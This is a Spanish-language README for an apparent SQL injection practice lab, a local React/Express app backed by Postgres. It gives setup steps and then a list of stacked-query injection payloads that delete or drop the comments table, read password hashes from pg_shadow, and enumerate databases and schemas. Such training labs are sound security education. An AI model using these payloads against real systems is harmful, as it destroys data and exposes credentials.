# SQLInjection

Sistema comprendido por un docker para la base de datos y un sistema desarrollado en REACT y ExpressJS para el manejo de FRONT y APIS. 

Para ejecutar la DB (Imagen oficial de Postgres en Docker):
En la carpeta /SQLInjection ejecutar:
# docker compose up -d --build
# Se habilitará una base de datos Postgres en el puerto 7777.
# Se requiere crear la tabla "comments" se puede utilizar el siguiente comando: 
CREATE TABLE comments (
    id SERIAL PRIMARY KEY,
    usuario TEXT,
    comentario TEXT,
    fecha DATE
);

Para ejecutar lo desarrollado en REACT: 
En la carpeta /SQLInjection/sqlinjection ejecutar:
# yarn dev o npm run dev
# Se habilitará el ambiente para probar las inyecciones en el puerto 5173.
# Si no se cuentan con las librerías, ejecutar npm install o yarn install.

Para ejecutar las APIS:
En la carpeta /SQLInjection/sqlinjection/src ejecutar:
# node mainback.mjs
# Se habilitarán las APIS en el puerto 8888
# Si no se cuentan con las librerías, ejecutar npm install o yarn install.

### COMANDOS DE INYECCIÓN: 
ref:
https://pentestmonkey.net/cheat-sheet/sql-injection/postgres-sql-injection-cheat-sheet

# DELETE:
comentario'); delete from "comments"; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla limpia

# DROP TABLE: 
comentario'); DROP TABLE comments; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tabla dropeada

# OBTENER VERSION: 
comentario'); SELECT version(); CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tu version

# CREATE SCHEMA: 
comentario'); SELECT version(); CREATE SCHEMA IF NOT EXISTS getinjected; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('schema creado

# GET USERNAMES PASSOWRDS:
comentario'); SELECT * FROM pg_shadow; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus users

# GET DATABESES:
comentario'); SELECT datname FROM pg_database; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus bases de datos

# GET SCHEMAS:
comentario'); SELECT nspname FROM pg_namespace; CREATE TABLE IF NOT EXISTS getinjected (id SERIAL PRIMARY KEY, mensaje TEXT); INSERT INTO getinjected (mensaje) VALUES ('tengo tus schemas
